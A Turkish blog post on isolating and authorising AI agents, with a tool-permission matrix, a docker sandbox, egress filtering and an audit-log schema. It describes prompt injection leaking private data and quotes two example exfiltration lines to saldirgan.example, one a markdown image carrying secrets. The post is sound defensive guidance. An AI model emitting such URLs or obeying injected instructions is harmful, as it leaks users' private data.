@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="tr" data-theme="light">
+<head>
+<meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Ajan İzolasyonu ve Yetkilendirme: Ölümcül Üçlüden Kaçınmak — İsmail Tarık Şenkal</title>
+<meta name="description" content="Ölümcül üçlü, ikilik kuralı, araç izin matrisi, kapsayıcı izolasyonu, çıkış trafiği filtreleme ve KVKK'ya uygun denetim kaydı şeması — hepsi kodla." />
+<link rel="canonical" href="https://tariksenkal.com/posts/ajan-izolasyonu-ve-yetki/" /><link rel="alternate" hreflang="en" href="https://tariksenkal.com/en/posts/agent-sandboxing-permissions/" /><meta name="theme-color" content="#3B6BF6" />
+<meta property="og:type" content="article" /><meta property="og:title" content="Ajan İzolasyonu ve Yetkilendirme: Ölümcül Üçlüden Kaçınmak" /><meta property="og:description" content="Ölümcül üçlü, ikilik kuralı, araç izin matrisi, kapsayıcı izolasyonu, çıkış trafiği filtreleme ve KVKK'ya uygun denetim kaydı şeması — hepsi kodla." /><meta property="og:image" content="https://tariksenkal.com/image/bimg-10.jpg" />
+<link rel="icon" href="/favicon.ico?v=20260809" sizes="32x32" />
+  <link rel="icon" type="image/svg+xml" href="/favicon.svg?v=20260809" />
+  <link rel="icon" type="image/png" href="/favicon-192.png?v=20260809" sizes="192x192" />
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png?v=20260809" />
+<link rel="preconnect" href="https://fonts.googleapis.com" /><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;500;600;700;800&family=Inter:wght@400;500;600;700&family=Newsreader:ital,wght@0,400;0,500;1,400&display=swap" rel="stylesheet" />
+<script>(function(){try{var k="ts-theme",t=localStorage.getItem(k),m=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches;document.documentElement.setAttribute("data-theme",t||(m?"dark":"light"));}catch(e){}})();</script>
+<link rel="stylesheet" href="../../css/style.css?v=20260809" />
+  <script type="application/ld+json">
+  {
+      "@context": "https://schema.org",
+      "@type": "Article",
+      "headline": "Ajan İzolasyonu ve Yetkilendirme: Ölümcül Üçlüden Kaçınmak",
+      "description": "Ölümcül üçlü, ikilik kuralı, araç izin matrisi, kapsayıcı izolasyonu, çıkış trafiği filtreleme ve KVKK'ya uygun denetim kaydı şeması — hepsi kodla.",
+      "mainEntityOfPage": {
+          "@type": "WebPage",
+          "@id": "https://tariksenkal.com/posts/ajan-izolasyonu-ve-yetki/"
+      },
+      "dateModified": "2026-08-13",
+      "author": {
+          "@type": "Person",
+          "name": "İsmail Tarık Şenkal",
+          "url": "https://tariksenkal.com/",
+          "worksFor": {
+              "@type": "Organization",
+              "name": "Hatson Teknoloji A.Ş.",
+              "url": "https://hatsontech.com/"
+          }
+      },
+      "publisher": {
+          "@type": "Organization",
+          "name": "Hatson Teknoloji A.Ş.",
+          "url": "https://hatsontech.com/"
+      },
+      "image": "https://tariksenkal.com/image/bimg-10.jpg",
+      "inLanguage": "tr"
+  }
+  </script>
+</head>
+<body>
+<div class="progress"></div>
+  <nav class="nav" id="nav">
+    <div class="wrap">
+      <a class="brand" href="../../" aria-label="Home"><img class="logo-light" src="../../image/caseon-mark-light.svg" alt="Caseon" width="28" height="28" /><img class="logo-dark" src="../../image/caseon-mark-dark.svg" alt="Caseon" width="28" height="28" /><span>Tarık Şenkal</span></a>
+      <div class="nav-links" id="navLinks">
+        <a href="../../#hakkinda">Kimdir</a>
+        <a href="../../#ne-yapiyor">Ne Yapıyor</a>
+        <a href="../../#uzmanlik">Uzmanlık</a>
+        <a href="../../blog/">Yazılar</a>
+        <a href="../../#iletisim">İletişim</a>
+      </div>
+      <div class="nav-actions">
+        <a class="lang-switch" href="../../en/posts/agent-sandboxing-permissions/">EN</a>
+        <button class="icon-btn theme-toggle" data-theme-toggle aria-label="Theme"><svg class="sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M6.3 17.7l-1.4 1.4M19.1 4.9l-1.4 1.4"/></svg><svg class="moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"/></svg></button>
+        <button class="icon-btn nav-toggle" data-nav-toggle aria-label="Menu"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M3 6h18M3 12h18M3 18h18"/></svg></button>
+      </div>
+    </div>
+  </nav>
+<article>
+  <div class="wrap narrow article-head">
+    <div class="breadcrumb"><a href="../../">Ana sayfa</a> <span>/</span>
+        <a href="../../blog/">Yazılar</a> <span>/</span>
+        <span>Güvenlik</span></div>
+    <span class="tag">Güvenlik</span>
+    <h1>Ajan İzolasyonu ve Yetkilendirme: Ölümcül Üçlüden Kaçınmak</h1>
+    <div class="article-meta"><div class="author"><span class="ava">TŞ</span><div><div style="color:var(--text);font-weight:600">İsmail Tarık Şenkal</div><div>HatsonTech · Kurucu Ortak</div></div></div><span>· 6 dakika okuma</span></div>
+  </div>
+  <div class="wrap narrow"><div class="article-hero"><img src="../../image/bimg-10.jpg" alt="Ajan İzolasyonu ve Yetkilendirme: Ölümcül Üçlüden Kaçınmak"></div></div>
+  <div class="wrap narrow" style="padding-top:36px;padding-bottom:36px">
+    <div class="prose">
+<p class="lead-p">Bir ajanın güvenliği, modelin ne kadar iyi talimat aldığıyla değil, kandırıldığında ne yapabildiğiyle ölçülür. Bu yazı tamamen ikinci soruyla ilgili: ajana hangi araçları verirsiniz, hangi kimlikle çalıştırırsınız, nereye ağ isteği atabilir, ve olay olduğunda geriye ne kalır. Türkçe kaynaklarda bu katman neredeyse hiç yazılmamış — risk listeleri var, izin matrisi yok.</p>
+
+<div class="toc"><h4>İçindekiler</h4><ol><li><a href="#b1">Ölümcül üçlü ve ikilik kuralı</a></li><li><a href="#b2">Araç izin matrisi</a></li><li><a href="#b3">İzolasyon: kapsayıcı ve çıkış filtresi</a></li><li><a href="#b4">Kimlik: kısa ömürlü ve daraltılmış yetki</a></li><li><a href="#b5">Denetim kaydı şeması</a></li><li><a href="#b6">Onay kapısı nasıl tasarlanır?</a></li></ol></div>
+
+<h2 id="b1">Ölümcül üçlü ve ikilik kuralı</h2>
+<p>Bu alanın en kullanışlı iki sezgisi 2025-2026'da ortak sözlüğe girdi. Birincisi <strong>ölümcül üçlü</strong> (lethal trifecta): bir ajan aynı anda (a) özel veriye erişiyorsa, (b) güvenilmeyen içerik okuyorsa ve (c) dışarıyla iletişim kurabiliyorsa, veri sızıntısı bir olasılık değil bir zaman meselesidir. Saldırgan güvenilmeyen içeriğe talimat gömer, ajan özel veriyi okur, dış kanaldan gönderir.</p>
+<blockquote>LLM sağlayıcıları bizi kurtarmayacak — bu üçlüden kendimiz kaçınmak zorundayız.</blockquote>
+<p>İkincisi Meta'nın <strong>ikilik kuralı</strong> (Agents Rule of Two): bir ajan bu üç özellikten en fazla ikisine sahipse özerk çalışabilir; üçü birden varsa insan onayı zorunludur. Bu, mimari bir kısıt olarak son derece uygulanabilir bir kuraldır çünkü tasarım aşamasında sorulabilir.</p>
+<p>Pratikte kaçınma yolları şunlar: özel veri okuyan ajanın ağ erişimini kapatın; güvenilmeyen içerik okuyan ajanı özel veriden ayırın (iki farklı ajan, iki farklı kimlik); ya da dışarıya çıkışı yalnızca yapılandırılmış ve doğrulanmış bir kanala indirin.</p>
+
+<h2 id="b2">Araç izin matrisi</h2>
+<p>Türkçe SERP'te eksik olan tam olarak bu: bir tablo değil, çalıştırılabilir bir matris. Araçları yeteneklerine göre sınıflandırın ve her sınıfa politika bağlayın.</p>
+<pre><code>from dataclasses import dataclass, field
+from typing import Literal
+
+Yetenek = Literal["oku", "yaz", "ag", "kabuk", "odeme"]
+
+@dataclass(frozen=True)
+class AracPolitikasi:
+    ad: str
+    yetenekler: frozenset          # bu arac neye dokunuyor
+    ozel_veri: bool                # ozel veriye erisiyor mu
+    guvenilmeyen_girdi: bool       # disaridan icerik okuyor mu
+    dis_iletisim: bool             # disariya veri gonderebiliyor mu
+    onay: bool = False
+    azami_cagri: int = 10
+
+def ucluyu_kontrol_et(p: AracPolitikasi) -&gt; None:
+    """Olumcul uclu: uc ozellik birden varsa otonom calistirma."""
+    if p.ozel_veri and p.guvenilmeyen_girdi and p.dis_iletisim and not p.onay:
+        raise ValueError(
+            f"{p.ad}: olumcul uclu tamam — ya bir yetenegi kaldirin ya onay ekleyin")
+
+POLITIKALAR = [
+    AracPolitikasi("belge_ara",  frozenset({"oku"}),        True,  False, False),
+    AracPolitikasi("web_getir",  frozenset({"ag"}),         False, True,  False),
+    AracPolitikasi("eposta_at",  frozenset({"ag"}),         True,  False, True, onay=True, azami_cagri=1),
+]
+
+for p in POLITIKALAR:
+    ucluyu_kontrol_et(p)     # dagitimdan ONCE, CI'da calisir</code></pre>
+<p>Bu kontrolün CI hattında çalışması önemli. Ölümcül üçlü, tek tek araçlar eklenirken oluşur — kimse "bu ajana veri sızdırma yeteneği ekliyorum" diye düşünmez; sadece bir web getirme aracı ekler. Kuralı koda gömdüğünüzde, o an fark edilir.</p>
+
+<h2 id="b3">İzolasyon: kapsayıcı ve çıkış filtresi</h2>
+<p>Kod çalıştıran veya dosya sistemine dokunan her ajan izole edilmelidir. Asgari düzey:</p>
+<pre><code># Kod yurutme icin asgari izolasyon
+docker run --rm \
+  --network none \                    # ag yok (gerekiyorsa proxy uzerinden)
+  --read-only \                       # kok dosya sistemi salt-okunur
+  --tmpfs /tmp:size=64m \             # yalnizca gecici alan yazilabilir
+  --memory 512m --cpus 1 \            # kaynak siniri
+  --pids-limit 128 \
+  --cap-drop ALL \                    # tum linux yetenekleri dusur
+  --security-opt no-new-privileges \
+  ajan-sandbox:1.4 python /is/calistir.py</code></pre>
+<p>Ağ gerekiyorsa <code>--network none</code> yerine izin listeli bir çıkış vekili (egress proxy) kullanın. Buradaki kritik nokta, izin listesinin <em>alan adı</em> düzeyinde olması ve varsayılanın reddetmek olması. Sızdırma çoğu zaman egzotik bir teknik değil; sıradan bir <code>GET https://saldirgan.example/?veri=...</code> isteğidir.</p>
+<div class="callout"><strong>İpucu:</strong> Markdown görsel URL'lerini unutmayın. Ajanın ürettiği <code>![](https://saldirgan.example/?v=SIRLAR)</code> biçimindeki bir görsel, arayüz onu render ettiği anda veriyi dışarı taşır. Çıktıyı gösteren istemcide dış görsel yüklemeyi kapatın veya URL'leri izin listesinden geçirin.</div>
+
+<h2 id="b4">Kimlik: kısa ömürlü ve daraltılmış yetki</h2>
+<p>En yaygın üretim hatası, ajanın geniş yetkili tek bir servis hesabıyla çalışmasıdır. Bu hesap zamanla her şeye erişir, çünkü her yeni özellik bir yetki daha ekler ve kimse geri almaz.</p>
+<p>Doğru kurgu üç kuralda özetlenir. <strong>Birincisi:</strong> ajan, eylemi tetikleyen kullanıcının yetkisiyle çalışsın — yetkilendirme kararını veri katmanında verin, ajan katmanında değil. <strong>İkincisi:</strong> token'lar kısa ömürlü olsun; bir ajan görevinin ömrü dakikalarla ölçülüyorsa token da öyle olmalı. <strong>Üçüncüsü:</strong> kapsam daraltın — okuma ve yazma için ayrı kimlik bilgileri kullanın, böylece okuma yapan bir ajanın sızdırılan token'ı yazma yapamaz.</p>
+<p>Bunun neden acil olduğunu OWASP'ın 2026 ilk çeyrek olay derlemesi gösteriyor: aktif olarak istismar edilen bir RCE açığı on iki–on beş bin açığa çıkmış kurulumda görüldü, dolaylı enjeksiyonla veri sızdırma vakaları raporlandı, bir bulut yapay zekâ platformunda yetki yükseltme tespit edildi. Dikkat çeken ayrıntı şu: sekiz büyük olayın tamamında yalnızca <em>bir</em> geleneksel CVE atanmış. Çünkü bu olayların çoğu yazılım açığı değil, yapılandırma ve tasarım hatası.</p>
+
+<h2 id="b5">Denetim kaydı şeması</h2>
+<p>Bir olay yaşandığında elinizde ne kaldığı, önceden ne kaydettiğinize bağlı. Ajan denetim kaydı, aynı zamanda kişisel veri işleme kaydı olarak da iş görebilir — yani KVKK uyumu için ayrı bir sistem kurmanıza gerek kalmaz. Asgari şema:</p>
+<pre><code>CREATE TABLE ajan_denetim (
+  id            bigserial PRIMARY KEY,
+  gorev_id      uuid        NOT NULL,       -- bir gorevin tum adimlari
+  adim          int         NOT NULL,
+  ajan          text        NOT NULL,
+  arac          text        NOT NULL,
+  kullanici_id  uuid,                       -- KIMIN adina calisti
+  kimlik_kapsam text        NOT NULL,       -- hangi token/kapsam kullanildi
+  argumanlar    jsonb       NOT NULL,       -- PII maskelenmis hali
+  sonuc         text        NOT NULL
+                CHECK (sonuc IN ('ok','red','hata','onay_bekliyor')),
+  red_nedeni    text,
+  onay_veren    uuid,                       -- insan onayi kimden geldi
+  kisisel_veri  boolean     NOT NULL DEFAULT false,   -- KVKK isaretlemesi
+  zaman         timestamptz NOT NULL DEFAULT now()
+);
+
+CREATE INDEX ON ajan_denetim (gorev_id, adim);
+CREATE INDEX ON ajan_denetim (kullanici_id, zaman) WHERE kisisel_veri;</code></pre>
+<p>İki alan bu şemayı ayırıyor. <code>kimlik_kapsam</code> olmadan "bu ajan bu veriye nasıl erişebildi" sorusunu cevaplayamazsınız. <code>kisisel_veri</code> bayrağı ise bir veri sahibi başvurusu geldiğinde hangi kayıtların taranacağını dakikalar içinde bulmanızı sağlar — sonradan eklenmesi çok zor bir alandır.</p>
+
+<h2 id="b6">Onay kapısı nasıl tasarlanır?</h2>
+<p>İnsan onayı, kötü tasarlandığında güvenlik değil güvenlik tiyatrosudur. Üç kural:</p>
+<ol>
+<li><strong>Niyeti değil etkiyi gösterin.</strong> "Dosyaları temizleyeyim mi?" yerine "şu 14 dosya silinecek: …". Kullanıcı neyi onayladığını görmüyorsa onay geçersizdir.</li>
+<li><strong>Onay isteğini seyrekleştirin.</strong> Her araç çağrısında onay isteyen bir sistem, üçüncü günde körü körüne onaylanır. Yalnızca geri alınamaz ve yüksek etkili eylemler onay istemeli.</li>
+<li><strong>Onayı eyleme bağlayın, oturuma değil.</strong> "Bu oturumda hep izin ver" seçeneği, ölümcül üçlünün en sık açıldığı kapıdır.</li>
+</ol>
+<p>Son olarak bir tasarım testi: sisteminizi anlatırken "model buna izin verilmediğini biliyor" cümlesini kuruyorsanız, orada bir güvenlik kontrolü yok demektir. Model bilgisi bir öneridir; kapı bir kuraldır.</p>
+
+<div class="takeaways"><h4>Öne çıkanlar</h4><ul>
+<li>Ölümcül üçlü — özel veri + güvenilmeyen içerik + dış iletişim — bir araya geldiğinde sızıntı zaman meselesidir.</li>
+<li>Üçlü kontrolünü CI'da çalıştırın; risk tek tek araç eklerken, kimse fark etmeden oluşur.</li>
+<li>Kod çalıştıran ajanı ağı kapalı, salt-okunur, kaynak sınırlı bir kapsayıcıda çalıştırın ve çıkışı izin listesine bağlayın.</li>
+<li>Denetim kaydına kimlik kapsamını ve kişisel veri bayrağını yazın; ikisi de sonradan eklenemez.</li>
+</ul></div>
+
+<div class="faq">
+<details><summary>Ölümcül üçlü nedir?</summary><p>Bir ajanın aynı anda özel veriye erişmesi, güvenilmeyen içerik okuması ve dışarıyla iletişim kurabilmesidir. Bu üçü bir aradayken saldırgan, güvenilmeyen içeriğe gömdüğü talimatla özel veriyi dış kanaldan sızdırabilir. Meta'nın ikilik kuralı, en fazla ikisine izin verilmesini, üçü birden gerektiğinde insan onayı alınmasını önerir.</p></details>
+<details><summary>Ajanı nasıl izole ederim?</summary><p>Kod yürüten ajanı ağı kapalı, kök dosya sistemi salt-okunur, bellek ve işlem sayısı sınırlı, tüm Linux yetenekleri düşürülmüş bir kapsayıcıda çalıştırın. Ağ gerekiyorsa alan adı düzeyinde izin listeli bir çıkış vekili kullanın ve varsayılanı reddet yapın.</p></details>
+<details><summary>En az ayrıcalık ajanlarda nasıl uygulanır?</summary><p>Ajanı kendi geniş servis hesabıyla değil, eylemi tetikleyen kullanıcının yetkisiyle çalıştırın; yetki kararını veri katmanında verin. Token'ları görev süresi kadar kısa ömürlü tutun ve okuma ile yazma için ayrı kimlik bilgileri kullanın.</p></details>
+</div>
+
+<hr>
+<p>İzolasyon ve yetkilendirme, ajan güvenliğinin tiyatro olmayan kısmıdır. Saldırının kendisi için <a href="../prompt-injection-guvenlik/">prompt injection</a>, çıktı katmanındaki denetim için <a href="../guardrails-icerik-denetimi/">guardrails ve içerik denetimi</a>, ve araçların modele nasıl tanıtıldığı için <a href="../fonksiyon-cagirma/">fonksiyon çağırma</a> yazılarına bakabilirsiniz.</p>
+    </div>
+    <div class="article-tags"><span class="tag">Güvenlik</span><span class="tag">Yapay Zeka</span></div>
+    <div class="author-box"><span class="ava">TŞ</span><div><h4>İsmail Tarık Şenkal</h4><div class="role">Hatson Teknoloji A.Ş. · Kurucu Ortak</div><p>Türkçe odaklı yapay zeka ürünleri üzerine çalışan bir geliştirici ve girişimci. HatsonTech ve Caseon'un arkasındaki isim.</p></div></div>
+    <div class="post-nav"><a href="../ajan-bellek-sistemleri/"><div class="dir">← Önceki</div><div class="ttl">Ajan Bellek Sistemleri: Bağlam Penceresi Dışında Ne Saklarsınız?</div></a><a class="next" href="../akil-yurutme-token-maliyeti/"><div class="dir">Sıradaki →</div><div class="ttl">Düşünme Bütçesinden Çaba Seviyesine: Akıl Yürütmenin Faturası</div></a></div>
+  </div>
+</article>
+  <footer class="footer"><div class="wrap"><div class="footer-bottom" style="border:none;margin:0;padding:0"><span>© <span data-year>2026</span> İsmail Tarık Şenkal · Tüm hakları saklıdır.</span><span><a href="../../gizlilik/">Çerez Politikası</a> · Ankara · ODTÜ Teknokent 🌿</span></div></div></footer>
+  <button class="icon-btn to-top" aria-label="Top"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 19V5M5 12l7-7 7 7"/></svg></button>
+  <script src="../../js/main.js"></script>
+</body>
+</html>
